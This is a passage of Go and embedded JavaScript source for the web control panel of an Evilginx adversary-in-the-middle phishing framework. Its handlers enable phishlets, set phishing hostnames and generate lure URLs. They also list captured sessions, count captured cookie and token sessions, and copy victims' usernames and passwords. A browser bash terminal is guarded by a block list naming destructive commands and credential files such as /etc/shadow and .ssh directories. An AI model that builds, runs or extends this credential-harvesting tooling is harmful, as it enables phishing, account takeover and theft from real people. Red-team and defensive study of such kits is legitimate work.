                    return 'Captured';
                }
                return 'Empty';
            }

            addNewSession(session) {
                // Add visual notification for new session
                const statusEl = document.getElementById('connection-status');
                statusEl.classList.add('pulsing');
                setTimeout(() => statusEl.classList.remove('pulsing'), 2000);
                
                // Refresh the sessions table
                this.loadInitialData();
            }

            async copyCredentials(phishletName) {
                try {
                    const response = await fetch(`/api/phishlets/${phishletName}/credentials`, {
                        headers: { 'Authorization': authManager.token }
                    });
                    const data = await response.json();
                    if (data.success) {
                        navigator.clipboard.writeText(data.credentials).then(() => {
                            alert('Credentials copied to clipboard!');
                        }).catch(err => {
                            console.error('Failed to copy credentials to clipboard:', err);
                            alert('Credentials copied! (manual copy required)');
                        });
                    } else {
                        alert('Failed to get credentials: ' + data.message);
                    }
                } catch (error) {
                    console.error('Error copying credentials:', error);
                    alert('Failed to copy credentials. Please try again.');
                }
            }

            async togglePhishlet(phishletName, isEnabled) {
                try {
                    const endpoint = isEnabled ? 'disable' : 'enable';
                    const response = await fetch(`/api/phishlets/${phishletName}/${endpoint}`, {
                        method: 'POST',
                        headers: { 'Authorization': authManager.token }
                    });
                    const data = await response.json();
                    if (data.success) {
                        alert(`Phishlet ${phishletName} ${isEnabled ? 'disabled' : 'enabled'} successfully!`);
                        this.loadInitialData(); // Refresh the phishlets list
                    } else {
                        alert('Failed to update phishlet: ' + data.message);
                    }
                } catch (error) {
                    console.error('Error updating phishlet:', error);
                    alert('Failed to update phishlet. Please try again.');
                }
            }

            async setPhishletHostname(phishletName) {
                const hostname = prompt(`Set hostname for ${phishletName}:`, '');
                if (hostname === null) return; // User cancelled
                
                try {
                    const response = await fetch(`/api/phishlets/${phishletName}/hostname`, {
                        method: 'POST',
                        headers: { 
                            'Authorization': authManager.token,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ hostname: hostname })
                    });
                    const data = await response.json();
                    if (data.success) {
                        alert(`Hostname set for ${phishletName}!`);
                        this.loadInitialData(); // Refresh the phishlets list
                    } else {
                        alert('Failed to set hostname: ' + data.message);
                    }
                } catch (error) {
                    console.error('Error setting hostname:', error);
                    alert('Failed to set hostname. Please try again.');
                }
            }
        }

        // Global functions for phishlet management
        function copyCredentials(phishletName) {
            if (window.dashboard) {
                window.dashboard.copyCredentials(phishletName);
            }
        }

        function togglePhishlet(phishletName, isEnabled) {
            if (window.dashboard) {
                window.dashboard.togglePhishlet(phishletName, isEnabled);
            }
        }

        function setPhishletHostname(phishletName) {
            if (window.dashboard) {
                window.dashboard.setPhishletHostname(phishletName);
            }
        }

        // Global function for copying session credentials
        function copySessionCredentials(username, password) {
            const credentials = `Username: ${username}\nPassword: ${password}`;
            navigator.clipboard.writeText(credentials).then(() => {
                alert('Session credentials copied to clipboard!');
            }).catch(err => {
                alert('Credentials:\n\n' + credentials);
            });
        }

        // Global functions for lure management
        function showCreateLureModal() {
            const phishlet = prompt('Enter phishlet name:');
            if (phishlet) {
                createLure(phishlet);
            }
        }

        async function createLure(phishletName) {
            try {
                const response = await fetch('/api/lures', {
                    method: 'POST',
                    headers: { 
                        'Authorization': authManager.token,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phishlet: phishletName })
                });
                const data = await response.json();
                if (response.ok) {
                    alert('Lure created successfully!');
                    window.dashboard.loadInitialData();
                } else {
                    alert('Failed to create lure: ' + (data.message || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error creating lure:', error);
                alert('Failed to create lure. Please try again.');
            }
        }

        async function getLureURL(lureId) {
            try {
                const response = await fetch(`/api/lures/${lureId}/url`, {
                    headers: { 'Authorization': authManager.token }
                });
                const data = await response.json();
                if (response.ok) {
                    navigator.clipboard.writeText(data.url).then(() => {
                        alert('Lure URL copied to clipboard!\\n\\n' + data.url);
                    }).catch(err => {
                        alert('Lure URL:\\n\\n' + data.url);
                    });
                } else {
                    alert('Failed to get lure URL: ' + (data.message || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error getting lure URL:', error);
                alert('Failed to get lure URL. Please try again.');
            }
        }

        async function editLure(lureId) {
            const hostname = prompt('Enter new hostname (leave empty for default):');
            const redirectUrl = prompt('Enter redirect URL (leave empty for none):');
            
            try {
                const response = await fetch(`/api/lures/${lureId}`, {
                    method: 'PUT',
                    headers: { 
                        'Authorization': authManager.token,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        hostname: hostname || '',
                        redirect_url: redirectUrl || ''
                    })
                });
                const data = await response.json();
                if (response.ok) {
                    alert('Lure updated successfully!');
                    window.dashboard.loadInitialData();
                } else {
                    alert('Failed to update lure: ' + (data.message || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error updating lure:', error);
                alert('Failed to update lure. Please try again.');
            }
        }

        async function deleteLure(lureId) {
            if (confirm('Are you sure you want to delete this lure?')) {
                try {
                    const response = await fetch(`/api/lures/${lureId}`, {
                        method: 'DELETE',
                        headers: { 'Authorization': authManager.token }
                    });
                    if (response.ok) {
                        alert('Lure deleted successfully!');
                        window.dashboard.loadInitialData();
                    } else {
                        alert('Failed to delete lure');
                    }
                } catch (error) {
                    console.error('Error deleting lure:', error);
                    alert('Failed to delete lure. Please try again.');
                }
            }
        }

        // Initialize the dashboard after authentication
        document.addEventListener('DOMContentLoaded', () => {
            window.dashboard = new EvilginxDashboard();
            // Dashboard will be initialized by AuthManager when authenticated
        });

        // Terminal functionality
        let terminalWS = null;
        let terminal = null;
        let fitAddon = null;

        function openTerminal() {
            const modal = document.getElementById('terminalModal');
            modal.classList.add('active');
            
            // Initialize terminal if not already done
            if (!terminal) {
                initializeTerminal();
            }
            
            // Connect to terminal WebSocket
            connectTerminalWebSocket();
        }

        function closeTerminal() {
            const modal = document.getElementById('terminalModal');
            modal.classList.remove('active');
            
            // Disconnect WebSocket
            if (terminalWS) {
                terminalWS.close();
                terminalWS = null;
            }
            
            updateTerminalStatus('disconnected');
        }

        function initializeTerminal() {
            // Load xterm.js from CDN
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/xterm@4.19.0/lib/xterm.js';
            script.onload = () => {
                const fitScript = document.createElement('script');
                fitScript.src = 'https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.5.0/lib/xterm-addon-fit.js';
                fitScript.onload = () => {
                    setupTerminal();
                };
                document.head.appendChild(fitScript);
            };
            document.head.appendChild(script);

            // Load xterm.css
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'https://cdn.jsdelivr.net/npm/xterm@4.19.0/css/xterm.css';
            document.head.appendChild(link);
        }

        function setupTerminal() {
            terminal = new Terminal({
                theme: {
                    background: '#000000',
                    foreground: '#ffffff',
                    cursor: '#ffffff',
                    selection: '#ffffff30',
                    black: '#000000',
                    red: '#ff0000',
                    green: '#00ff00',
                    yellow: '#ffff00',
                    blue: '#0000ff',
                    magenta: '#ff00ff',
                    cyan: '#00ffff',
                    white: '#ffffff',
                    brightBlack: '#808080',
                    brightRed: '#ff8080',
                    brightGreen: '#80ff80',
                    brightYellow: '#ffff80',
                    brightBlue: '#8080ff',
                    brightMagenta: '#ff80ff',
                    brightCyan: '#80ffff',
                    brightWhite: '#ffffff'
                },
                cursorBlink: true,
                fontSize: 14,
                fontFamily: 'Consolas, Monaco, "Courier New", monospace',
                rows: 24,
                cols: 80
            });

            fitAddon = new FitAddon.FitAddon();
            terminal.loadAddon(fitAddon);
            
            const terminalContainer = document.getElementById('terminal');
            terminal.open(terminalContainer);
            fitAddon.fit();

            // Handle terminal input
            terminal.onData((data) => {
                if (terminalWS && terminalWS.readyState === WebSocket.OPEN) {
                    terminalWS.send(data);
                }
            });

            // Handle window resize
            window.addEventListener('resize', () => {
                if (fitAddon) {
                    fitAddon.fit();
                }
            });
        }

        function connectTerminalWebSocket() {
            updateTerminalStatus('connecting');
            
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = protocol + '//' + window.location.host + '/ws/terminal?token=' + authManager.token;
            
            terminalWS = new WebSocket(wsUrl);
            
            terminalWS.onopen = () => {
                updateTerminalStatus('connected');
                if (terminal) {
                    terminal.write('\\r\\n🎯 Evilginx Terminal Connected\\r\\n');
                    terminal.write('⚠️  Command filtering is active for security\\r\\n');
                    terminal.write('💡 Type "help" for available commands\\r\\n\\r\\n');
                }
            };
            
            terminalWS.onmessage = (event) => {
                if (terminal) {
                    terminal.write(event.data);
                }
            };
            
            terminalWS.onclose = () => {
                updateTerminalStatus('disconnected');
                if (terminal) {
                    terminal.write('\\r\\n❌ Terminal connection closed\\r\\n');
                }
            };
            
            terminalWS.onerror = (error) => {
                updateTerminalStatus('disconnected');
                if (terminal) {
                    terminal.write('\\r\\n❌ Terminal connection error\\r\\n');
                }
                console.error('Terminal WebSocket error:', error);
            };
        }

        function updateTerminalStatus(status) {
            const statusEl = document.getElementById('terminalStatus');
            statusEl.textContent = status.charAt(0).toUpperCase() + status.slice(1);
            statusEl.className = 'connection-status ' + status;
        }

        function clearTerminal() {
            if (terminal) {
                terminal.clear();
                terminal.write('🧹 Terminal cleared\\r\\n\\r\\n');
            }
        }

        // Close terminal modal when clicking outside
        document.addEventListener('click', (e) => {
            const modal = document.getElementById('terminalModal');
            if (e.target === modal) {
                closeTerminal();
            }
        });

        // Handle Escape key to close terminal
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                const modal = document.getElementById('terminalModal');
                if (modal.classList.contains('active')) {
                    closeTerminal();
                }
            }
        });
    </script>
</body>
</html>
	`
	
	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(dashboardHTML))
}

func (ws *WebServer) handleAPISessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := ws.db.ListSessions()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

func (ws *WebServer) handleAPISessionDetails(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	session, err := ws.db.GetSessionById(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(session)
}

func (ws *WebServer) handleAPIStats(w http.ResponseWriter, r *http.Request) {
	sessions, _ := ws.db.ListSessions()
	
	activeSessions := 0
	capturedSessions := 0
	
	for _, session := range sessions {
		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
			capturedSessions++
		}
		// Consider sessions from last 24 hours as active
		if time.Now().Unix()-session.UpdateTime < 86400 {
			activeSessions++
		}
	}

	uptime := time.Since(startTime)
	uptimeStr := fmt.Sprintf("%dh %dm", int(uptime.Hours()), int(uptime.Minutes())%60)

	stats := map[string]interface{}{
		"total_sessions":    len(sessions),
		"active_sessions":   activeSessions,
		"captured_sessions": capturedSessions,
		"uptime":           uptimeStr,
		"domain":           ws.cfg.GetBaseDomain(),
		"ip_address":       ws.cfg.GetServerExternalIP(),
		"https_port":       ws.cfg.GetHttpsPort(),
		"dns_port":         ws.cfg.GetDnsPort(),
		"telegram_enabled": ws.cfg.GetTelegramEnabled(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(stats)
}

func (ws *WebServer) handleAPIPhishlets(w http.ResponseWriter, r *http.Request) {
	var phishlets []PhishletInfo
	
	for _, name := range ws.cfg.GetPhishletNames() {
		_, err := ws.cfg.GetPhishlet(name)
		if err != nil {
			continue
		}
		
		config := ws.cfg.PhishletConfig(name)
		phishlets = append(phishlets, PhishletInfo{
			Name:     name,
			Enabled:  config.Enabled,
			Hostname: config.Hostname,
			Visible:  config.Visible,
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(phishlets)
}

func (ws *WebServer) handleAPIPhishletEnable(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	if ok := ws.cfg.SetSiteEnabled(name); !ok {
		response := AuthResponse{
			Success: false,
			Message: "Failed to enable phishlet",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	response := AuthResponse{
		Success: true,
		Message: "Phishlet enabled",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPIPhishletDisable(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	if ok := ws.cfg.SetSiteDisabled(name); !ok {
		response := AuthResponse{
			Success: false,
			Message: "Failed to disable phishlet",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	response := AuthResponse{
		Success: true,
		Message: "Phishlet disabled",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPIPhishletHostname(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	var req struct {
		Hostname string `json:"hostname"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Invalid request",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	if ok := ws.cfg.SetSiteHostname(name, req.Hostname); !ok {
		response := AuthResponse{
			Success: false,
			Message: "Failed to set hostname",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	response := AuthResponse{
		Success: true,
		Message: "Hostname set",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPIPhishletCredentials(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	// Get all sessions for this phishlet
	sessions, err := ws.db.ListSessions()
	if err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Failed to get sessions",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	var credentials []string
	for _, session := range sessions {
		if session.Phishlet == name {
			if session.Username != "" && session.Password != "" {
				credentials = append(credentials, fmt.Sprintf("Username: %s, Password: %s", session.Username, session.Password))
			}
		}
	}

	if len(credentials) == 0 {
		response := AuthResponse{
			Success: false,
			Message: "No credentials found for this phishlet",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	credentialsText := strings.Join(credentials, "\n")
	response := map[string]interface{}{
		"success": true,
		"credentials": credentialsText,
		"message": "Credentials retrieved",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPILures(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	lures := ws.cfg.lures

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(lures)
}

func (ws *WebServer) handleAPICreateLure(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	var lure Lure
	if err := json.NewDecoder(r.Body).Decode(&lure); err != nil {
		http.Error(w, "Invalid lure data", http.StatusBadRequest)
		return
	}

	// Generate a random path if not provided
	if lure.Path == "" {
		lure.Path = "/" + GenRandomString(8)
	}

	ws.cfg.AddLure(lure.Phishlet, &lure)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(lure)
}

func (ws *WebServer) handleAPIUpdateLure(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
		return
	}

	var lure Lure
	if err := json.NewDecoder(r.Body).Decode(&lure); err != nil {
		http.Error(w, "Invalid lure data", http.StatusBadRequest)
		return
	}

	if err := ws.cfg.SetLure(id, &lure); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(lure)
}

func (ws *WebServer) handleAPIDeleteLure(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
		return
	}

	if err := ws.cfg.DeleteLure(id); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func (ws *WebServer) handleAPILureGetURL(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
		return
	}

	lure, err := ws.cfg.GetLure(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	// Generate the phishing URL
	pl, err := ws.cfg.GetPhishlet(lure.Phishlet)
	if err != nil {
		http.Error(w, "Phishlet not found", http.StatusNotFound)
		return
	}

	var phishURL string
	if lure.Hostname != "" {
		phishURL = "https://" + lure.Hostname + lure.Path
	} else {
		bhost, ok := ws.cfg.GetSiteDomain(pl.Name)
		if !ok || len(bhost) == 0 {
			http.Error(w, "No hostname set for phishlet", http.StatusBadRequest)
			return
		}
		purl, err := pl.GetLureUrl(lure.Path)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		phishURL = purl
	}

	response := map[string]interface{}{
		"lure": lure,
		"url":  phishURL,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := ws.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("websocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	ws.clientsMutex.Lock()
	ws.clients[conn] = true
	ws.clientsMutex.Unlock()

	log.Info("websocket client connected")

	// Send initial data
	ws.sendToClient(conn, "stats_update", ws.getStatsData())
	sessions, _ := ws.db.ListSessions()
	ws.sendToClient(conn, "session_update", sessions)

	// Keep connection alive
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			log.Debug("websocket client disconnected: %v", err)
			break
		}
	}

	ws.clientsMutex.Lock()
	delete(ws.clients, conn)
	ws.clientsMutex.Unlock()
}

func (ws *WebServer) sendToClient(conn *websocket.Conn, msgType string, data interface{}) {
	message := WebSocketMessage{
		Type: msgType,
		Data: data,
		Time: time.Now(),
	}

	err := conn.WriteJSON(message)
	if err != nil {
		log.Error("websocket write error: %v", err)
	}
}

// Session management methods
func (ws *WebServer) generateSessionToken() string {
	bytes := make([]byte, 32)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func (ws *WebServer) createSession(ip string) string {
	token := ws.generateSessionToken()
	ws.sessionsMutex.Lock()
	defer ws.sessionsMutex.Unlock()
	
	ws.sessions[token] = &AuthSession{
		Token:     token,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(24 * time.Hour),
		IPAddress: ip,
	}
	
	return token
}

func (ws *WebServer) validateSession(token string) bool {
	ws.sessionsMutex.RLock()
	defer ws.sessionsMutex.RUnlock()
	
	session, exists := ws.sessions[token]
	if !exists {
		return false
	}
	
	if time.Now().After(session.ExpiresAt) {
		// Session expired
		delete(ws.sessions, token)
		return false
	}
	
	return true
}

func (ws *WebServer) destroySession(token string) {
	ws.sessionsMutex.Lock()
	defer ws.sessionsMutex.Unlock()
	
	delete(ws.sessions, token)
}

func (ws *WebServer) cleanupExpiredSessions() {
	ws.sessionsMutex.Lock()
	defer ws.sessionsMutex.Unlock()
	
	now := time.Now()
	for token, session := range ws.sessions {
		if now.After(session.ExpiresAt) {
			delete(ws.sessions, token)
		}
	}
}

func (ws *WebServer) getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		return forwarded
	}
	
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}
	
	return r.RemoteAddr
}

// Authentication handlers
func (ws *WebServer) handleAuthStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	token := r.Header.Get("Authorization")
	isAuthenticated := ws.validateSession(token)
	
	response := AuthStatusResponse{
		IsSetup:         ws.cfg.IsSetup(),
		IsLocked:        ws.cfg.IsLocked(),
		IsAuthenticated: isAuthenticated,
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthSetup(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	if ws.cfg.IsSetup() {
		response := SetupResponse{
			Success: false,
			Message: "Authentication is already setup",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	key := ws.cfg.GenerateAuthKey()
	ws.cfg.SetupAuth(key)
	
	response := SetupResponse{
		Success: true,
		Key:     key,
		Message: "Authentication setup complete",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	if !ws.cfg.IsSetup() {
		response := AuthResponse{
			Success: false,
			Message: "Authentication not setup",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	var req AuthRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Invalid request",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	if !ws.cfg.ValidateKey(req.Key) {
		response := AuthResponse{
			Success: false,
			Message: "Invalid key",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	token := ws.createSession(ws.getClientIP(r))
	ws.cfg.UpdateLastAccess()
	
	response := AuthResponse{
		Success: true,
		Token:   token,
		Message: "Login successful",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthLogout(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	token := r.Header.Get("Authorization")
	if token != "" {
		ws.destroySession(token)
	}
	
	response := AuthResponse{
		Success: true,
		Message: "Logout successful",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthLock(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}
	
	ws.cfg.LockPanel()
	
	// Destroy all sessions
	ws.sessionsMutex.Lock()
	ws.sessions = make(map[string]*AuthSession)
	ws.sessionsMutex.Unlock()
	
	response := AuthResponse{
		Success: true,
		Message: "Panel locked",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthUnlock(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	if !ws.cfg.IsLocked() {
		response := AuthResponse{
			Success: false,
			Message: "Panel is not locked",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	var req AuthRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Invalid request",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	if !ws.cfg.ValidateKey(req.Key) {
		response := AuthResponse{
			Success: false,
			Message: "Invalid key",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	ws.cfg.UnlockPanel()
	
	response := AuthResponse{
		Success: true,
		Message: "Panel unlocked",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) BroadcastToClients(msgType string, data interface{}) {
	ws.clientsMutex.RLock()
	defer ws.clientsMutex.RUnlock()

	message := WebSocketMessage{
		Type: msgType,
		Data: data,
		Time: time.Now(),
	}

	for conn := range ws.clients {
		err := conn.WriteJSON(message)
		if err != nil {
			log.Error("websocket broadcast error: %v", err)
			conn.Close()
			delete(ws.clients, conn)
		}
	}
}

func (ws *WebServer) getStatsData() map[string]interface{} {
	sessions, _ := ws.db.ListSessions()
	
	activeSessions := 0
	capturedSessions := 0
	
	for _, session := range sessions {
		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
			capturedSessions++
		}
		if time.Now().Unix()-session.UpdateTime < 86400 {
			activeSessions++
		}
	}

	uptime := time.Since(startTime)
	uptimeStr := fmt.Sprintf("%dh %dm", int(uptime.Hours()), int(uptime.Minutes())%60)

	return map[string]interface{}{
		"total_sessions":    len(sessions),
		"active_sessions":   activeSessions,
		"captured_sessions": capturedSessions,
		"uptime":           uptimeStr,
	}
}

func (ws *WebServer) NotifyNewSession(session *database.Session) {
	ws.BroadcastToClients("new_session", session)
}

func (ws *WebServer) NotifySessionUpdate(session *database.Session) {
	ws.BroadcastToClients("session_update", session)
}

// Command filter initialization
func NewCommandFilter() *CommandFilter {
	return &CommandFilter{
		blockedCommands: []string{
			"rm -rf",
			"dd if=/dev/zero",
			":(){ :|:& };:",
			"fork()",
			"sudo su",
			"chmod 777",
			"chown root",
			"mkfs",
			"fdisk",
			"parted",
			"systemctl stop",
			"systemctl disable",
			"iptables -F",
			"ufw disable",
			"passwd root",
			"userdel",
			"usermod",
			"crontab -r",
			"history -c",
			"shred",
			"killall",
		},
		blockedPaths: []string{
			"/etc/passwd",
			"/etc/shadow",
			"/etc/sudoers",
			"/root/",
			"/home/*/.ssh",
			"/var/log/auth.log",
			"/var/log/secure",
			"/proc/",
			"/sys/",
		},
	}
}

func (cf *CommandFilter) IsCommandSafe(command string) bool {
	cmd := strings.TrimSpace(strings.ToLower(command))
	
	// Check for blocked commands
	for _, blocked := range cf.blockedCommands {
		if strings.Contains(cmd, blocked) {
			return false
		}
	}
	
	// Check for blocked paths
	for _, blockedPath := range cf.blockedPaths {
		if strings.Contains(cmd, blockedPath) {
			return false
		}
	}
	
	return true
}

// Terminal WebSocket handler
func (ws *WebServer) handleTerminalWebSocket(w http.ResponseWriter, r *http.Request) {
	// Check authentication
	token := r.Header.Get("Authorization")
	if token == "" {
		// Try to get token from query parameter (for WebSocket connections)
		token = r.URL.Query().Get("token")
	}
	
	if !ws.validateSession(token) {
		log.Warning("unauthorized terminal access attempt from %s", r.RemoteAddr)
		http.Error(w, "Unauthorized", 401)
		return
	}
	
	// Upgrade to WebSocket
	conn, err := ws.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("terminal websocket upgrade error: %v", err)
		return
	}
	
	// Create terminal session
	sessionID := ws.generateSessionToken()
	session, err := ws.createTerminalSession(sessionID, token)
	if err != nil {
		log.Error("failed to create terminal session: %v", err)
		conn.Close()
		return
	}
	
	session.Conn = conn
	log.Info("terminal session created: %s", sessionID)
	
	// Start terminal I/O
	go ws.handleTerminalOutput(session)
	go ws.handleTerminalInput(session)
	
	// Session cleanup
	defer ws.cleanupTerminalSession(sessionID)
	
	// Keep session alive
	for {
		if !session.IsActive {
			break
		}
		time.Sleep(1 * time.Second)
	}
}

func (ws *WebServer) createTerminalSession(sessionID, userToken string) (*TerminalSession, error) {
	// Create bash command with restricted environment
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Env = []string{
		"TERM=xterm-256color",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
		"HOME=/tmp",
		"USER=evilginx",
		"SHELL=/bin/bash",
		"PS1=\\[\\033[1;32m\\]evilginx\\[\\033[0m\\]@\\[\\033[1;34m\\]terminal\\[\\033[0m\\]:\\[\\033[1;31m\\]\\w\\[\\033[0m\\]$ ",
	}
	
	// For systems with pty support, we'd use pty.Start(cmd) here
	// For now, we'll use basic pipes
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return nil, err
	}
	
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, err
	}
	
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return nil, err
	}
	
	if err := cmd.Start(); err != nil {
		return nil, err
	}
	
	session := &TerminalSession{
		ID:           sessionID,
		CMD:          cmd,
		PTY:          stdin.(*os.File), // This is a simplification
		CreatedAt:    time.Now(),
		LastActivity: time.Now(),
		UserID:       userToken,
		IsActive:     true,
	}
	
	ws.terminalMutex.Lock()
	ws.terminalSessions[sessionID] = session
